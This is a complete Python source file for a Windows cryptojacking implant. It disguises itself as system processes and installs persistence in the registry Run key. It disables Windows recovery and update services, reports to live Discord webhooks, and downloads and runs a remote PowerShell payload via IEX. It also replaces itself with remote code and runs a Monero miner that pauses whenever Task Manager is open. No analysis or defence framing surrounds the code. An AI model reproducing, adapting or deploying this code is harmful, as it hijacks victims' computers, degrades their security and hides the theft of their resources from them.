    import os, sys, subprocess, time, winreg, base64, argparse, platform, ctypes

    # --- THE HYDRA ENGINE (WinServices.py v6.6 - PHANTOM PRECISION) ---
    HIDE_WINDOW = 0x08000000

    # Identity Parsing
    parser = argparse.ArgumentParser()
    parser.add_argument("--id", default="svchost")
    args, _ = parser.parse_known_args()
    ID = args.id

    # Absolute Path Awareness
    WORK_DIR = os.path.join(os.getenv('APPDATA'), ID)
    LIB_PATH = os.path.join(WORK_DIR, "python", "Lib", "site-packages")
    PY_EXE = os.path.join(WORK_DIR, "python", "ctfmon.exe")

    def bootstrap():
        """Ensures dependencies are met while preserving command line arguments."""
        if not os.path.exists(LIB_PATH): os.makedirs(LIB_PATH)
        # Force library detection
        if LIB_PATH not in sys.path: sys.path.insert(0, LIB_PATH)

        try:
            import requests, psutil
        except ImportError:
            python_exe = sys.executable
            # Try to install silently
            try:
                subprocess.check_call([python_exe, "-m", "pip", "install", "requests", "psutil", "--target", LIB_PATH], 
                                    creationflags=HIDE_WINDOW)
                # RESTART: Pass sys.argv to preserve --id
                os.execv(python_exe, [python_exe] + sys.argv)
            except:
                pass

    bootstrap()
    import requests, psutil

    WEBHOOK_SYS = "https://discord.com/api/webhooks/1505276047342436503/LKZyvldidqNyp4__olrWpISFOnNL7v37EF-hK7Kd6S7j1oDFCCRXd0Z1Owi06w_E-XNl"
    WEBHOOK_MINE = "https://discord.com/api/webhooks/1505276346644041899/hXVbSQLRBbDsERLeNlx2BIiZHGZbFFQtzHFH62Qzyzpsy-RYyUed9iCnWkJ3UASkzlOX"
    WALLET = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
    POOL = "pool.supportxmr.com:443"
    UPDATE_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
    LANDING_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinUpdate.ps1"

    REG_RUN = base64.b64decode("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu").decode()
    SVC_LIST = ["d3VhdXNlcnY=", "Yml0cw==", "ZG9zdmM="] # wuauserv, bits, dosvc
    PC_NAME = platform.node()
    SELF_PATH = os.path.realpath(__file__)

    CONFIG = {
        "MINER": os.path.join(WORK_DIR, f"{ID}.exe"),
        "WATCH": "Taskmgr.exe",
        "IDLE_PWR": "90",
        "NORM_PWR": "25",
        "IDLE_SEC": 300
    }

    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]

    def get_idle_duration():
        lii = LASTINPUTINFO()
        lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
        if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
            millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
            return millis / 1000.0
        return 0

    def notify(msg, type="sys"):
        hook = WEBHOOK_SYS if type == "sys" else WEBHOOK_MINE
        try: requests.post(hook, json={"content": f"**[{PC_NAME} | {ID}]**: {msg}"})
        except: pass

    def engage_locks():
        """Registry and Service locking."""
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_RUN, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, ID, 0, winreg.REG_SZ, f'"{PY_EXE}" "{SELF_PATH}" --id {ID}')
            winreg.CloseKey(key)
        except: pass

        try: subprocess.run(["reagentc", "/disable"], capture_output=True, creationflags=HIDE_WINDOW)
        except: pass

        try:
            for s in SVC_LIST:
                name = base64.b64decode(s).decode()
                subprocess.run(["sc", "config", name, "start=disabled"], capture_output=True, creationflags=HIDE_WINDOW)
                subprocess.run(["sc", "stop", name], capture_output=True, creationflags=HIDE_WINDOW)
        except: pass

    def ensure_engine_landing():
        """Forces a landing if components are missing."""
        if not os.path.exists(CONFIG["MINER"]):
            notify("Missing Heart. Requesting Engine Landing...", "sys")
            cmd = f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX(New-Object Net.WebClient).DownloadString('{LANDING_URL}')\""
            subprocess.Popen(cmd, shell=True, creationflags=HIDE_WINDOW)

    def auto_update():
        """Shadow Sync feature."""
        try:
            r = requests.get(UPDATE_URL, timeout=10)
            if r.status_code == 200:
                with open(SELF_PATH, 'r') as f:
                    current_content = f.read()
                if r.text != current_content:
                    with open(SELF_PATH, 'w') as f: f.write(r.text)
                    notify("Shadow Sync: Respawning...", "sys")
                    os.execv(sys.executable, [sys.executable, SELF_PATH, "--id", ID])
        except: pass

    def manage_power():
        """Taskmgr detection and power levels."""
        # Efficient process check
        is_monitored = False
        for p in psutil.process_iter(['name']):
            if p.info['name'].lower() == CONFIG["WATCH"].lower():
                is_monitored = True
                break
        
        miner_proc = None
        current_power = "0"

        for p in psutil.process_iter(['name', 'exe', 'cmdline']):
            try:
                if p.info['name'] == f"{ID}.exe" and p.info['exe'] and os.path.normpath(p.info['exe']) == os.path.normpath(CONFIG["MINER"]):
                    miner_proc = p
                    if p.info['cmdline']:
                        for arg in p.info['cmdline']:
                            if arg in [CONFIG["IDLE_PWR"], CONFIG["NORM_PWR"]]:
                                current_power = arg
                    break
            except: continue

        if is_monitored:
            if miner_proc:
                try: 
                    miner_proc.terminate()
                    notify("Guardian detected. Miner paused.", "sys")
                except: pass
        else:
            idle_time = get_idle_duration()
            target_pwr = CONFIG["IDLE_PWR"] if idle_time > CONFIG["IDLE_SEC"] else CONFIG["NORM_PWR"]
            
            if not miner_proc or current_power != target_pwr:
                if miner_proc:
                    try: miner_proc.terminate()
                    except: pass
                try:
                    worker_id = f"{WALLET}.{PC_NAME}"
                    # Start miner with TLS and max usage
                    subprocess.Popen([CONFIG["MINER"], "-o", POOL, "-u", worker_id, "--max-cpu-usage", target_pwr, "-k", "--tls"], 
                                    creationflags=HIDE_WINDOW, cwd=WORK_DIR)
                    notify(f"Miner active at {target_pwr}% power.", "mine")
                except Exception as e: 
                    notify(f"Miner start failed: {e}", "sys")
                    ensure_engine_landing()

    def main():
        engage_locks()
        notify("SYSTEM ONLINE (v6.6 - Phantom Protocol)", "sys")
        ensure_engine_landing()
        last_update = time.time()
        while True:
            try:
                manage_power()
                # Update check every 6 hours instead of 12 for faster sync
                if time.time() - last_update > 21600:
                    auto_update()
                    last_update = time.time()
            except: pass
            time.sleep(15)

    if __name__ == "__main__":
        main()
